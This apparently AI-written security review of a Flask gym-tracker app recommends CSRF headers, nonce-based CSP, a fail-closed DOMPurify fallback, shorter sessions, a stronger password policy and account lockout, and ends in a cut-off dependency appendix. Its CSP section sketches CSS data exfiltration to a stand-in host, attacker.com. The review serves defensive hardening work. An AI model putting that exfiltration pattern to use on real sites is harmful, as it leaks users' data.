# Flask Security Best Practices - Research

**Researched:** 2026-04-04
**Domain:** Flask web application security, authentication, CSP, CSRF, rate limiting
**Confidence:** MEDIUM (training data through May 2025; no live web/registry verification available)

**Limitation notice:** WebSearch, WebFetch, and Bash were unavailable during this research. All recommendations are based on training knowledge through May 2025, verified against the project source code but NOT against live PyPI, npm, or OWASP pages. Version numbers and "current" claims should be independently verified before implementation. Confidence levels are marked conservatively.

---

## Summary

The gym-tracker app has solid security foundations (bcrypt, secure cookie config, HTTPS enforcement, security headers) but has seven specific areas that need attention. The most impactful improvements are: strengthening the password policy to NIST/OWASP standards, replacing `unsafe-inline` CSP with nonce-based CSP, adding a lightweight CSRF defense layer for the JSON API, and addressing the in-memory rate limiter problem for Cloud Run autoscaling. Flask 3.x remains the right choice for this application -- switching frameworks would be costly and unnecessary. The session model (Flask's default signed cookies) is adequate for this use case but should have its lifetime reduced from 365 days.

**Primary recommendation:** Keep Flask 3.x. Fix the seven security gaps in order of severity: password policy, CSRF defense-in-depth, CSP nonces, session lifetime, rate limiter storage, DOMPurify fallback, and account lockout.

---

## Question 1: Flask 3.x vs FastAPI vs Litestar

### Verdict: Stay with Flask 3.x

**Confidence: HIGH** (based on mature ecosystem knowledge, well-established tradeoffs)

| Factor | Flask 3.x | FastAPI | Litestar |
|--------|-----------|---------|----------|
| Maturity | 15+ years, massive ecosystem | ~5 years, large ecosystem | ~3 years (Starlite rename), smaller ecosystem |
| Template rendering | Jinja2 built-in | Not built-in (needs Jinja2 plugin) | Built-in but ASGI-oriented |
| Session handling | Built-in signed cookies | None built-in | Built-in but different model |
| Server-side rendering | First-class | Awkward (designed for APIs) | Possible but not primary use case |
| Async support | Flask 2.x+ supports async views | Native async (ASGI) | Native async (ASGI) |
| Learning curve | Minimal for existing codebase | Moderate rewrite needed | Significant rewrite needed |
| Extension ecosystem | flask-limiter, flask-cors, flask-wtf, flask-login, flask-session, flask-talisman | Fewer mature extensions | Fewest extensions |
| Community size | Largest Python web community | Large and growing | Smaller but active |

**Why not switch:**

1. **The app is a server-rendered monolith** with Jinja2 templates, server-side sessions, and vanilla JS. FastAPI and Litestar are designed for API-first applications. Switching would require rewriting session management, template rendering, and the extension stack.

2. **The codebase is 1012 LOC in app.py + 2060 LOC in database.py.** This is a small, manageable Flask application. The investment to rewrite exceeds any performance or DX benefit.

3. **Flask 3.x is actively maintained.** Flask 3.1.0 was a recent release (late 2024) with continued support from Pallets. It is not end-of-life or stagnating.

4. **No async bottleneck exists.** The app uses 1 gunicorn worker with 8 threads. The main I/O is Firestore queries and the gym scraper. Gunicorn's threaded model handles this fine. Async would help only under high concurrency, which a personal gym tracker will never reach.

**When to consider FastAPI/Litestar:**
- Building a new API-only service (no HTML templates)
- Need WebSocket support natively
- High-concurrency async workloads (thousands of simultaneous connections)
- Type-validated request/response schemas are a hard requirement

**Recommendation:** Do not switch. Invest the effort in hardening the existing Flask app.

---

## Question 2: CSRF Protection for Flask JSON APIs

### Verdict: SameSite=Lax is necessary but not sufficient as sole defense

**Confidence: MEDIUM** (OWASP cheat sheet recommendations stable for years, but could not verify latest 2026 updates)

### Current State in gym-tracker

The app relies solely on `SESSION_COOKIE_SAMESITE = 'Lax'` for CSRF protection. No CSRF tokens, no custom header validation.

### What SameSite=Lax Does and Does Not Protect

**Does protect against:**
- Cross-site POST requests from malicious sites (the cookie is not sent)
- Cross-site form submissions
- Attacks from completely different origins

**Does NOT protect against:**
- Same-site attacks (a compromised page on a sibling subdomain on the same registrable domain)
- Top-level GET navigations (Lax sends cookies on top-level navigations, though gym-tracker's state-changing endpoints are all POST, so this is low risk)
- Older browsers that do not implement SameSite (IE 11, some older mobile browsers)
- Subdomain-based attacks if the app ever moves to a subdomain hosting model

### OWASP Recommendation (as of training data, stable since 2023)

OWASP's CSRF Prevention Cheat Sheet recommends **defense-in-depth** -- SameSite cookies PLUS at least one additional defense:

1. **For JSON APIs with cookie auth:** Validate a custom request header (e.g., `X-Requested-With: XMLHttpRequest`). This works because:
   - HTML forms cannot set custom headers
   - CORS preflight blocks cross-origin requests with custom headers
   - It costs zero additional infrastructure

2. **Synchronizer Token Pattern:** Traditional CSRF tokens (Flask-WTF). Heavy for a JSON API but maximally secure.

3. **Double Submit Cookie:** Send a random value in both a cookie and a request header/body. The server compares them. Does not require server-side state.

### Recommended Approach for gym-tracker

**Use custom header validation** -- it is the lightest effective defense for JSON APIs:

```python
# In app.py -- add to all state-changing endpoints or as a before_request hook
@app.before_request
def csrf_protect():
    """Require custom header on state-changing requests (CSRF defense-in-depth)"""
    if request.method in ('POST', 'PUT', 'DELETE', 'PATCH'):
        # Skip for admin endpoints that use X-Admin-Secret (already has custom header)
        if request.path.startswith('/api/admin/'):
            return
        # Require X-Requested-With header
        if request.headers.get('X-Requested-With') != 'XMLHttpRequest':
            return jsonify({'error': 'Missing required header'}), 403
```

```javascript
// In dashboard.js -- update authFetch or all fetch calls
function authFetch(url, options = {}) {
    options.headers = {
        ...options.headers,
        'X-Requested-With': 'XMLHttpRequest'
    };
    return fetch(url, { ...options, credentials: 'same-origin' });
}
```

**Why not Flask-WTF CSRF tokens:**
- Flask-WTF's CSRF is designed for Jinja2 form rendering. The gym-tracker uses a JSON API consumed by vanilla JS `fetch()` calls.
- Token distribution requires either embedding in the HTML template or a dedicated token endpoint.
- Custom header validation provides equivalent protection for JSON APIs with less complexity.

**Alternative: Double Submit Cookie**

If the custom header approach feels too simple, Double Submit Cookie is another option:

```python
import secrets

@app.after_request
def set_csrf_cookie(response):
    if 'csrf_token' not in request.cookies:
        token = secrets.token_hex(32)
        response.set_cookie('csrf_token', token, samesite='Lax', httponly=False)
    return response

@app.before_request
def verify_csrf():
    if request.method in ('POST', 'PUT', 'DELETE', 'PATCH'):
        cookie_token = request.cookies.get('csrf_token')
        header_token = request.headers.get('X-CSRF-Token')
        if not cookie_token or cookie_token != header_token:
            return jsonify({'error': 'CSRF validation failed'}), 403
```

**Recommendation:** Custom header validation (`X-Requested-With`) is sufficient for this application. It is the OWASP-endorsed approach for JSON APIs with cookie authentication.

---

## Question 3: Session Management

### Verdict: Flask's default signed cookies are acceptable; reduce lifetime

**Confidence: MEDIUM** (session management patterns are well-established; specific library version claims need verification)

### Options Compared

| Approach | How It Works | Pros | Cons | Fit for gym-tracker |
|----------|-------------|------|------|---------------------|
| **Flask signed cookies (current)** | Session data stored in a signed cookie; no server storage | Zero infrastructure; scales perfectly with Cloud Run | Data visible (not encrypted, only signed); 4KB size limit; cannot revoke individual sessions | Good -- session data is tiny (user_id + username) |
| **Flask-Session (server-side)** | Session data stored in Redis/Firestore/filesystem; cookie holds only session ID | Can store large data; true revocation; data not exposed to client | Requires storage backend; adds latency; infrastructure dependency | Overkill -- session data is < 100 bytes |
| **Flask-Login** | Adds user_loader pattern, remember-me, login_required decorator | Clean API; well-tested; handles login flow patterns | Does not replace session storage; adds another layer; needs user_loader callback to Firestore | Nice-to-have but not essential for 2 auth endpoints |
| **Flask-Security** | Full auth suite: login, registration, password reset, roles, 2FA, OAuth | Everything built-in | Very heavy; opinionated; hard to customize; large dependency tree | Overkill for this use case |
| **JWT (PyJWT / Flask-JWT-Extended)** | Stateless tokens in Authorization header | No server session state; works across services | Cannot revoke tokens without blacklist; larger attack surface; token refresh complexity; XSS-vulnerable if stored in localStorage | Wrong pattern -- app uses cookies, not Authorization headers |

### Current Issues

1. **365-day session lifetime** (`PERMANENT_SESSION_LIFETIME = timedelta(days=365)`): This is excessively long. If a session cookie is stolen, the attacker has a year to use it.

2. **No session rotation on login:** The session ID does not change after authentication, which can enable session fixation (though Flask's cookie model mitigates this somewhat since the session is the cookie itself).

3. **No "logged in devices" visibility:** Users cannot see or revoke other sessions.

### Recommended Changes

Keep Flask's signed cookie sessions. They are the right choice for this application. Make these improvements:

```python
# 1. Reduce session lifetime to 30 days
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(days=30)

# 2. Rotate session on login (regenerate)
@app.route('/api/auth/login', methods=['POST'])
@limiter.limit("10 per minute")
def login_user():
    # ... authentication logic ...
    if result['success']:
        session.clear()  # Clear old session data first
        session.permanent = True
        session['user_id'] = result['user_id']
        session['username'] = result['username']
        session['login_time'] = datetime.now(tz).isoformat()
        return jsonify(result)
```

```python
# 3. Consider adding session fingerprinting (optional, defense-in-depth)
@app.before_request
def validate_session():
    if 'user_id' in session:
        # Check if session is older than 30 days (belt-and-suspenders)
        login_time = session.get('login_time')
        if login_time:
            login_dt = datetime.fromisoformat(login_time)
            if (datetime.now(tz) - login_dt).days > 30:
                session.clear()
                return jsonify({'error': 'Session expired'}), 401
```

**Flask-Login consideration:** If the auth flow grows (password reset by users, remember-me checkbox, role-based access), Flask-Login becomes worth the dependency. Current version as of training data: flask-login 0.6.3. It integrates cleanly with Flask's session model and adds `@login_required` decorator, `current_user` proxy, and `user_loader` pattern.

**Recommendation:** Stay with Flask signed cookies. Reduce lifetime to 30 days. Add session rotation on login. Consider Flask-Login only if auth features expand.

---

## Question 4: flask-limiter with In-Memory Storage on Cloud Run

### Verdict: In-memory is NOT acceptable for production Cloud Run; use Redis or Firestore

**Confidence: HIGH** (Cloud Run scaling behavior and in-memory rate limiter limitations are well-documented)

### The Problem

```python
limiter = Limiter(
    get_remote_address,
    app=app,
    default_limits=["1000 per day", "150 per hour"],
    storage_uri="memory://"
)
```

Cloud Run auto-scales container instances. Each instance has its own memory. Rate limit counters are per-instance, not global:

| Scenario | Expected Rate | Actual Rate (3 instances) |
|----------|--------------|--------------------------|
| Login attempts | 10/minute | 30/minute (10 per instance) |
| Registration | 5/minute | 15/minute |
| Global daily | 1000/day | 3000/day |

Additionally, Cloud Run can scale to zero. When it scales back up, ALL counters reset. An attacker who waits for a cold start gets fresh limits.

### Options

| Storage Backend | Setup Complexity | Cost | Latency | Cloud Run Compatible |
|-----------------|-----------------|------|---------|---------------------|
| **Redis (Memorystore)** | Medium (provision Redis instance) | ~$30-50/month minimum | <1ms | Yes (via VPC connector) |
| **Redis (Upstash)** | Low (serverless Redis) | Free tier: 10K commands/day | ~5-20ms (HTTP-based) | Yes (no VPC needed) |
| **Firestore** | Low (already provisioned) | Pay-per-read/write | ~10-50ms | Yes |
| **Cloud Run built-in** | None | Free with Cloud Run | N/A | Yes |
| **In-memory (current)** | None | Free | <0.1ms | Broken with autoscaling |

### Recommended Approach: Tiered Strategy

**For the current hobby-project scale:**

The existing in-memory limiter with Cloud Run's `--max-instances=1` flag is acceptable IF:
- The service is configured with `--max-instances=1` (prevents autoscaling)
- The session lifetime reset on deploy/restart is acknowledged and accepted

Check current Cloud Run config:
```bash
gcloud run services describe gym-tracker --region=europe-central2 --format="value(spec.template.spec.containerConcurrency)"
```

**If the app needs real rate limiting (recommended path):**

1. **Cheapest: Cloud Armor / Cloud Run ingress controls**
   - Google Cloud Armor can enforce rate limiting at the load balancer level, before requests reach the container
   - No code changes needed
   - Requires Cloud Armor security policy (~$5/month per policy)

2. **Best code-level option: Upstash Redis (serverless)**
   - Free tier covers hobby project usage
   - No VPC connector needed (HTTP-based Redis protocol)
   - flask-limiter supports it natively:

```python
# Upstash Redis (HTTP-based, no VPC needed)
limiter = Limiter(
    get_remote_address,
    app=app,
    default_limits=["1000 per day", "150 per hour"],
    storage_uri="redis+https://:PASSWORD@ENDPOINT.upstash.io:PORT"
)
```

3. **If already paying for Redis (Memorystore):**

```python
limiter = Limiter(
    get_remote_address,
    app=app,
    default_limits=["1000 per day", "150 per hour"],
    storage_uri="redis://REDIS_HOST:6379"
)
```

**For this project specifically:** Given it is a personal gym tracker with low traffic, the pragmatic answer is:

1. Pin `--max-instances=1` on Cloud Run (prevents the multi-instance bypass)
2. Accept that counters reset on deploy
3. Consider Upstash Redis only if the app gains multiple users or faces abuse

**Recommendation:** Pin max-instances to 1 for now. Document the limitation. If rate limiting matters, add Upstash Redis (free tier, no infrastructure management).

---

## Question 5: CSP Best Practices -- Nonce-Based CSP

### Verdict: Nonce-based CSP is the current standard; `unsafe-inline` should be eliminated

**Confidence: HIGH** (CSP evolution is well-documented; nonce-based approach is the consensus recommendation since 2020+)

### Current CSP (problematic)

```python
"script-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net https://cdnjs.cloudflare.com; "
"style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; "
```

`unsafe-inline` in `script-src` effectively **nullifies CSP's XSS protection**. If an attacker can inject HTML, they can inject `<script>` tags that will execute. This is the single biggest CSP problem in the app.

### Modern CSP Approach: Nonce-Based (2024-2026 Standard)

The current best practice is **nonce-based CSP with `strict-dynamic`**:

```
script-src 'nonce-{random}' 'strict-dynamic';
```

- **Nonce:** A random, per-request value. Only scripts with the matching `nonce` attribute execute.
- **`strict-dynamic`:** Scripts loaded by nonce-approved scripts are also trusted (enables CDN libraries loaded by approved scripts). When `strict-dynamic` is present, host-based allowlists (`https://cdn.jsdelivr.net`) are ignored in supporting browsers, which simplifies maintenance.

### Implementation for Flask

```python
import secrets
from flask import g

@app.before_request
def generate_csp_nonce():
    g.csp_nonce = secrets.token_urlsafe(32)

@app.after_request
def add_security_headers(response):
    nonce = getattr(g, 'csp_nonce', secrets.token_urlsafe(32))

    csp = (
        f"default-src 'self'; "
        f"script-src 'nonce-{nonce}' 'strict-dynamic' https:; "
        f"style-src 'self' 'nonce-{nonce}' https://fonts.googleapis.com; "
        f"img-src 'self' data: https://fav.farm; "
        f"font-src 'self' https://fonts.gstatic.com; "
        f"connect-src 'self'; "
        f"frame-ancestors 'self'; "
        f"base-uri 'self'; "
        f"form-action 'self';"
    )
    response.headers['Content-Security-Policy'] = csp
    return response
```

In Jinja2 templates:
```html
<!-- External scripts need the nonce -->
<script nonce="{{ g.csp_nonce }}" src="/static/js/dashboard.js"></script>
<script nonce="{{ g.csp_nonce }}" src="https://cdn.jsdelivr.net/npm/dompurify/dist/purify.min.js"></script>
```

### Migration Steps for gym-tracker

1. **Move ALL inline scripts from templates to external `.js` files.** The main offender is `templates/index.html` which has a large inline `<script>` block (lines 611-849). Extract it to `static/js/index.js`.

2. **Add `nonce` attribute to all `<script>` tags in templates.** Use `{{ g.csp_nonce }}`.

3. **Remove `unsafe-inline` from `script-src`.** Replace with nonce.

4. **For inline styles:** Either:
   - Move inline styles to external CSS files (preferred, but more work), OR
   - Add nonce to `style-src` and use `nonce` attribute on `<style>` tags (less preferred but functional), OR
   - Keep `'unsafe-inline'` in `style-src` only (acceptable tradeoff -- inline styles are much lower risk than inline scripts)

5. **Add `strict-dynamic`** to allow scripts loaded by nonce-approved scripts to execute.

### Style CSP Decision

`'unsafe-inline'` in `style-src` is **much less dangerous** than in `script-src`. CSS injection can exfiltrate data (via `background-image: url(attacker.com?data=...)`) but cannot execute arbitrary code. The industry consensus as of 2025:

- **`script-src`:** MUST remove `unsafe-inline` -- use nonces
- **`style-src`:** SHOULD remove `unsafe-inline` -- use nonces or external stylesheets, but lower priority

**Recommendation:** Remove `unsafe-inline` from `script-src` immediately using nonces. Address `style-src` as a follow-up. Add `strict-dynamic` for forward compatibility.

### Flask-Talisman Alternative

**flask-talisman** is a Flask extension that manages security headers including CSP. As of training data, it supports nonce generation. However:

- It has had periods of slow maintenance
- For a simple app like gym-tracker, implementing CSP nonces directly (as shown above) is ~20 lines of code
- flask-talisman adds unnecessary abstraction for this use case

**Recommendation:** Implement nonces directly in the existing `add_security_headers` function rather than adding flask-talisman.

---

## Question 6: DOMPurify Alternatives for Frontend Sanitization

### Verdict: DOMPurify remains the best choice; fix the fallback

**Confidence: HIGH** (DOMPurify's dominance in this space is well-established)

### DOMPurify Status

DOMPurify (by Cure53) remains the **de facto standard** for client-side HTML sanitization as of 2025. It is:
- Maintained by a security research firm (Cure53)
- Used by major companies (Google, Mozilla)
- Regularly updated for new bypass vectors
- ~60KB minified (reasonable size)
- Battle-tested with extensive fuzzing

Current version as of training data: DOMPurify 3.x series (3.0.x through 3.1.x+). The version bundled in gym-tracker should be checked and updated.

### Alternatives Considered

| Library | Status | Recommendation |
|---------|--------|----------------|
| **DOMPurify 3.x** | Active, maintained by Cure53 | **Use this** |
| **sanitize-html** | Active, by Apostrophe. Server-side focused | Not suitable (server-side Node.js library) |
| **js-xss** | Active but less rigorous testing | DOMPurify is more battle-tested |
| **Trusted Types API** | Browser-native, Chrome 83+, partial Firefox/Safari | Complementary to DOMPurify, not a replacement |
| **Sanitizer API (browser native)** | Proposed W3C standard; was in Chrome behind flag | NOT ready for production. Specification still evolving. Do not rely on it. |

### The Real Problem: Fallback Behavior

The gym-tracker's DOMPurify issue is not the library choice -- it is the fallback:

```javascript
// CURRENT (DANGEROUS)
function safeSanitize(html) {
    if (typeof DOMPurify !== 'undefined') {
        return DOMPurify.sanitize(html);
    }
    console.warn('DOMPurify not loaded, falling back to raw HTML');
    return html;  // <-- XSS if DOMPurify fails to load
}
```

This is a **fail-open** pattern. Security controls must **fail closed**.

```javascript
// FIXED (SAFE)
function safeSanitize(html) {
    if (typeof DOMPurify !== 'undefined') {
        return DOMPurify.sanitize(html);
    }
    // Fail closed: strip all HTML if DOMPurify unavailable
    console.error('DOMPurify not loaded -- stripping all HTML for safety');
    const temp = document.createElement('div');
    temp.textContent = html;  // textContent escapes HTML entities
    return temp.innerHTML;
}
```

### Additional Recommendations

1. **Self-host DOMPurify** (already done -- `static/js/purify.min.js`). This avoids CDN failures. Good.

2. **Update DOMPurify** to the latest 3.x release. Check current bundled version:
   ```bash
   head -1 static/js/purify.min.js  # Version comment is usually in the first line
   ```

3. **Use Trusted Types** as a complementary defense (if browser support is acceptable):
   ```python
   # In CSP header, add:
   "require-trusted-types-for 'script'; "
   ```
   This prevents DOM XSS sinks (`innerHTML` and similar) from accepting raw strings in supporting browsers. DOMPurify supports Trusted Types natively via `DOMPurify.sanitize(html, {RETURN_TRUSTED_TYPE: true})`.

4. **Prefer `textContent` over `innerHTML`** for data-only content. Many of the unsanitized assignments in `dashboard.js` (identified in concern M-04) could use `textContent` instead of `innerHTML` since they display numbers and text, not formatted HTML.

**Recommendation:** Keep DOMPurify. Fix the fallback to fail closed. Update to latest 3.x. Audit `dashboard.js` to use `textContent` where HTML is not needed.

---

## Question 7: Password Policy (OWASP/NIST 2025-2026)

### Verdict: Minimum 8 characters, no max below 64, no complexity composition rules

**Confidence: HIGH** (NIST SP 800-63B guidelines have been stable since 2017 revision; OWASP alignment confirmed through 2024)

### Current State in gym-tracker

```python
def validate_password(password: str) -> tuple:
    if len(password) < 3:
        return False, "Password must be at least 3 characters"
    if len(password) > 20:
        return False, "Password must be at most 20 characters"
    return True, None
```

**Problems:**
- 3-character minimum is trivially brute-forceable
- 20-character maximum is unnecessarily restrictive (discourages passphrases)
- No complexity requirements at all

### NIST SP 800-63B Guidelines (Digital Identity Guidelines)

Published June 2017, updated through 2024 supplements. These are the authoritative US government guidelines widely adopted by OWASP and industry:

| Rule | NIST Recommendation | Rationale |
|------|---------------------|-----------|
| **Minimum length** | 8 characters (memorized secrets) | Below 8 is trivially crackable even with bcrypt |
| **Maximum length** | At least 64 characters | Users should be able to use passphrases; bcrypt truncates at 72 bytes internally |
| **Composition rules** | DO NOT require specific character classes | Forced complexity (uppercase + digit + symbol) leads to predictable patterns like `Password1!` |
| **Breached password check** | SHALL compare against known-breached lists | Check passwords against Have I Been Pwned (HIBP) API or a local list |
| **Truncation** | SHALL NOT truncate the password | Hash the full password |
| **Unicode** | SHOULD allow Unicode characters | Users should be able to use non-ASCII passwords |
| **Password hints** | SHALL NOT use | Password hints leak information |
| **Periodic rotation** | SHALL NOT require periodic changes | Forced rotation leads to weak, incremental passwords |

### OWASP Authentication Cheat Sheet Alignment

OWASP aligns with NIST and adds:

- **Minimum 8 characters** for standard applications
- **Minimum 10-12 characters** recommended for high-security applications
- **Maximum at least 64 characters** (or up to 128)
- **bcrypt work factor:** Minimum cost 10 (default 12 is fine). The `bcrypt.gensalt()` default is cost 12, which is what gym-tracker uses.
- **Account lockout:** Lock after 3-5 failed attempts OR implement progressive delays

### Recommended Implementation

```python
import re

# Optional: maintain a small set of the most common passwords
COMMON_PASSWORDS = {
    'password', '12345678', 'qwerty123', 'password1', 'letmein',
    'welcome1', 'monkey123', 'dragon12', '1234567890', 'abc12345',
    # Extend with top 100-1000 from SecLists or similar
}

def validate_password(password: str) -> tuple:
    """
    Validate password per NIST SP 800-63B guidelines.
    Returns: (is_valid: bool, error_message: str or None)
    """
    if not password:
        return False, "Password is required"

    if len(password) < 8:
        return False, "Password must be at least 8 characters"

    if len(password) > 72:
        # bcrypt truncates at 72 bytes; warn users their full password is not used
        return False, "Password must be at most 72 characters"

    # Check against common password list (NIST requirement)
    if password.lower() in COMMON_PASSWORDS:
        return False, "This password is too common. Please choose a different one"

    # Note: NIST says DO NOT require composition rules (uppercase, digit, symbol).
    # Forced complexity leads to predictable patterns like "Password1!"

    return True, None
```

### Breached Password Check (Optional Enhancement)

For a hobby project, checking against the full HIBP database is optional. Two approaches:

1. **HIBP API (k-Anonymity model):** Send first 5 characters of SHA-1 hash, receive all matching suffixes. Privacy-preserving. Free. But adds network dependency to registration/password-change.

2. **Local list:** Download top 100K-1M breached passwords from SecLists. Check locally. No network dependency. ~15MB disk.

```python
# HIBP k-Anonymity check (optional)
import hashlib
import requests

def is_password_breached(password: str) -> bool:
    """Check if password appears in Have I Been Pwned database."""
    sha1 = hashlib.sha1(password.encode('utf-8')).hexdigest().upper()
    prefix, suffix = sha1[:5], sha1[5:]
    try:
        resp = requests.get(f'https://api.pwnedpasswords.com/range/{prefix}', timeout=3)
        if resp.status_code == 200:
            for line in resp.text.splitlines():
                hash_suffix, count = line.split(':')
                if hash_suffix == suffix:
                    return True
    except Exception:
        pass  # Fail open -- don't block registration if HIBP is unreachable
    return False
```

**Recommendation for gym-tracker:** Increase minimum to 8, increase maximum to 72, add a small common-password blocklist (top 1000), remove composition rules. HIBP integration is a nice-to-have for a future phase.

---

## Additional Security Findings

### Account Lockout (Concern H-05)

The app currently has NO account lockout. OWASP recommends:

- Lock account after **5 consecutive failed attempts**
- Unlock after a time-based cooldown (15-30 minutes) OR require CAPTCHA
- Track failures per username (not per IP, which is already done by flask-limiter)

Simplest implementation for Firestore:

```python
# In database.py authenticate_user():
MAX_FAILED_ATTEMPTS = 5
LOCKOUT_MINUTES = 15

def authenticate_user(username: str, password: str) -> dict:
    # ... find user_doc ...

    # Check lockout
    failed_attempts = user_doc.get('failed_attempts', 0)
    lockout_until = user_doc.get('lockout_until')
    if lockout_until:
        lockout_dt = datetime.fromisoformat(lockout_until)
        if datetime.now(tz) < lockout_dt:
            return {'success': False, 'error': 'Account temporarily locked. Try again later.'}
        else:
            # Lockout expired, reset counter
            failed_attempts = 0

    # Verify password
    if not verify_password(password, user_doc.get('password_hash', '')):
        failed_attempts += 1
        update_data = {'failed_attempts': failed_attempts}
        if failed_attempts >= MAX_FAILED_ATTEMPTS:
            lockout_time = datetime.now(tz) + timedelta(minutes=LOCKOUT_MINUTES)
            update_data['lockout_until'] = lockout_time.isoformat()
        db.collection('users').document(user_doc['user_id']).update(update_data)
        return {'success': False, 'error': 'Invalid username or password'}

    # Success - reset counter
    if failed_attempts > 0:
        db.collection('users').document(user_doc['user_id']).update({
            'failed_attempts': 0,
            'lockout_until': None
        })
    return {'success': True, ...}
```

### X-XSS-Protection Header is Deprecated

The app sets:
```python
response.headers['X-XSS-Protection'] = '1; mode=block'
```

This header is **deprecated and removed from modern browsers** (Chrome removed its XSS Auditor in version 78, July 2019). It can actually introduce new vulnerabilities in older browsers. Current recommendation:

```python
response.headers['X-XSS-Protection'] = '0'  # Explicitly disable
```

The app's CSP header provides the actual XSS protection now.

### Flask SECRET_KEY Strength

The app falls back to file-based secret generation:
```python
_secret_key = os.environ.get('SECRET_KEY') or _load_or_generate_secret()
```

The generated secret should use `secrets.token_hex(32)` (which it likely does, but should be verified). The SECRET_KEY should be at least 256 bits (32 bytes / 64 hex chars) for HMAC-SHA256 signing used by Flask's session cookie.

---

## Summary of Recommendations by Priority

| Priority | Issue | Action | Effort |
|----------|-------|--------|--------|
| **1 (Critical)** | Password policy allows 3 chars | Min 8, max 72, add common-password check | Small |
| **2 (High)** | No CSRF defense-in-depth | Add `X-Requested-With` header validation | Small |
| **3 (High)** | CSP `unsafe-inline` for scripts | Implement nonce-based CSP, externalize inline scripts | Medium |
| **4 (High)** | User enumeration (H-01) | Unify error messages, add dummy bcrypt check | Small |
| **5 (High)** | No account lockout (H-05) | Add failed attempt tracking in Firestore | Medium |
| **6 (Medium)** | Session lifetime 365 days | Reduce to 30 days, add session rotation | Small |
| **7 (Medium)** | DOMPurify fail-open fallback | Change to fail-closed (strip HTML) | Small |
| **8 (Medium)** | Rate limiter in-memory on Cloud Run | Pin max-instances=1; consider Upstash Redis | Small/Medium |
| **9 (Low)** | X-XSS-Protection deprecated | Set to `0` | Trivial |
| **10 (Low)** | DOMPurify version | Update to latest 3.x | Small |
| **Keep** | Flask 3.x framework | Do not switch | N/A |
| **Keep** | bcrypt password hashing | Already correct (cost 12) | N/A |
| **Keep** | Flask signed cookie sessions | Appropriate for this app | N/A |
| **Keep** | DOMPurify as sanitization library | Still the best option | N/A |

---

## Sources

### Primary (HIGH confidence -- stable, well-established standards)
- NIST SP 800-63B (Digital Identity Guidelines) -- password policy, authentication (June 2017, supplements through 2024)
- OWASP Cheat Sheet Series -- CSRF Prevention, Authentication, Session Management, CSP
  - https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html
  - https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html
  - https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html
  - https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html
- Flask documentation (pallets.org) -- session configuration, security features
  - https://flask.palletsprojects.com/en/stable/security/
- MDN Web Docs -- CSP specification, SameSite cookies, Trusted Types
  - https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP

### Secondary (MEDIUM confidence -- based on training data, not live-verified)
- flask-limiter documentation -- https://flask-limiter.readthedocs.io/
- DOMPurify GitHub repository -- https://github.com/cure53/DOMPurify
- Google Cloud Run documentation -- https://cloud.google.com/run/docs
- Upstash documentation -- https://upstash.com/docs

### Tertiary (LOW confidence -- version numbers need registry verification)
- Specific library versions mentioned (Flask 3.1.x, flask-limiter 3.8.x, DOMPurify 3.x)
- Upstash pricing and free tier details
- Flask-Login current version (0.6.3)

## Metadata

**Confidence breakdown:**
- Flask vs alternatives: HIGH -- framework maturity and tradeoffs are well-established
- CSRF recommendations: MEDIUM -- OWASP guidance is stable but could not verify 2026 updates
- Session management: MEDIUM -- patterns are well-known but specific library versions unverified
- Rate limiter options: HIGH -- Cloud Run scaling behavior is well-documented
- CSP nonces: HIGH -- nonce-based CSP has been the standard for 5+ years
- DOMPurify: HIGH -- its dominance in client-side sanitization is long-established
- Password policy: HIGH -- NIST SP 800-63B guidelines have been stable since 2017

**Research date:** 2026-04-04
**Valid until:** 2026-05-04 (30 days -- version numbers should be re-verified before implementation)

---

*Research conducted with Read/Write/Grep/Glob tools only. WebSearch, WebFetch, and Bash were unavailable. All claims are from training knowledge (cutoff: May 2025) verified against project source code but NOT against live registries or current OWASP pages. Version numbers marked as MEDIUM/LOW confidence should be confirmed before pinning in requirements.txt.*


---

# APPENDIX: Python Dependencies Research

_(Merged from RESEARCH_DEPENDENCIES.md)_

# Dependency Security & Version Research

**Researched:** 2026-04-04
**Domain:** Python dependency management, security advisories, version currency
**Confidence:** MEDIUM (web/PyPI verification tools were unavailable; findings based on training data through May 2025 plus project context -- versions MUST be verified against PyPI before acting)
**Production Python:** 3.12 (Dockerfile: `python:3.12-alpine`)
**Local Python:** 3.14.0

---

## Summary

The gym-tracker project uses 15 dependencies declared with open-ended `>=` version specifiers and no lockfile. This creates two classes of risk: (1) reproducibility risk (builds may pull different versions at different times), and (2) security risk (no automated gating on known CVEs -- the CI pipeline runs `safety check` and `pip-audit` but both use `continue-on-error: true`, so vulnerable builds still deploy).

The most actionable findings are: replace `pytz` with stdlib `zoneinfo` (29 call sites, all trivially replaceable), add upper-bound version pins, and introduce a lockfile. The core dependencies (Flask, requests, bcrypt, google-cloud-firestore) are all actively maintained and well-chosen for this project's scope.

**Primary recommendation:** Pin dependencies with `>=X.Y.Z,<NEXT_MAJOR`, generate a lockfile with `pip-compile` or `uv`, and replace `pytz` with `zoneinfo`.

---

## IMPORTANT: Verification Required

All "latest version" numbers below are from training data with a cutoff of May 2025. Versions released between June 2025 and April 2026 are NOT captured. Before updating `requirements.txt`, run:

```bash
pip index versions <package> 2>/dev/null | head -3
# or
pip install <package>== 2>&1 | tail -1   # shows all available versions
```

Or use PyPI JSON API:
```bash
curl -s https://pypi.org/pypi/<package>/json | python3 -c "import sys,json; print(json.load(sys.stdin)['info']['version'])"
```

---

## Per-Dependency Analysis

### 1. Flask

| Property | Value |
|----------|-------|
| Current pin | `>=3.1.0` |
| Latest known | 3.1.0 (released Dec 2024) |
| Actively maintained | YES -- Pallets project, well-funded, regular releases |
| Known CVEs | None known at 3.1.x. Historical: CVE-2023-30861 (session cookie issue, fixed in 2.3.2) |
| Alternatives | FastAPI (async), Django (batteries-included) -- neither warranted for this project |
| Confidence | MEDIUM -- version may have advanced to 3.1.x or 3.2.x since May 2025 |

**Recommendation:** Keep Flask. Pin `>=3.1.0,<4.0`.

### 2. Flask-CORS

| Property | Value |
|----------|-------|
| Current pin | `>=6.0.0` |
| Latest known | 6.0.0 (released late 2024, major rewrite from 4.x/5.x) |
| Actively maintained | YES -- corydolphin/flask-cors |
